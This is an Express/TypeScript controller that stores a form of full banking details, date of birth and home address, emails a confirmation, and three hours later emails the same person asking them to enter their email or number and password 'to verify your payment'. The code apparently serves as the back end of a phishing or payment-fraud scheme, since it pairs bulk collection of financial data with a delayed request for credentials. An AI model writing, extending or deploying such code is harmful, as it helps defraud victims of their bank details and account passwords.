import { Request, Response } from 'express';
import BankingInfo from '../models/FormModel'; // Import the Mongoose model
import { sendMail } from '../mail/MailerServices'; // Import the mailer service

// Define controller methods
export const saveBankingInfo = async (req: Request, res: Response) => {
  try {
    // Extract data from request body
    const {
      firstName,
      lastName,
      email,
      mobileNumber,
      accountName,
      accountNumber,
      bankName,
      bankAddress,
      ibanNumber,
      swiftBic,
      routingNumber,
      country,
      homeAddress,
      accountType,
      dateOfBirth
    } = req.body;

    // Create a new instance of the model
    const bankingInfo = new BankingInfo({
      firstName,
      lastName,
      email,
      mobileNumber,
      accountName,
      accountNumber,
      bankName,
      bankAddress,
      ibanNumber,
      swiftBic,
      routingNumber,
      country,
      homeAddress,
      accountType,
      dateOfBirth
    });

    // Save the data to the database
    await bankingInfo.save();

    // Send immediate email
    await sendMail(
      email,
      'Details Received',
      'Your details have been received and are being processed.'
    );

    // Schedule email for 3 hours later
    setTimeout(async () => {
      await sendMail(
        email,
        'Next Verification Step',
        'Please enter your email or number and password to verify your payment.'
      );
    }, 3 * 60 * 60 * 1000); // 3 hours in milliseconds

    // Respond with success message
    res.status(201).json({ message: 'Banking information saved successfully and email sent.' });
  } catch (error) {
    // Handle errors
    console.error('Error saving banking information:', error);
    res.status(500).json({ error: 'An error occurred while saving banking information' });
  }
};
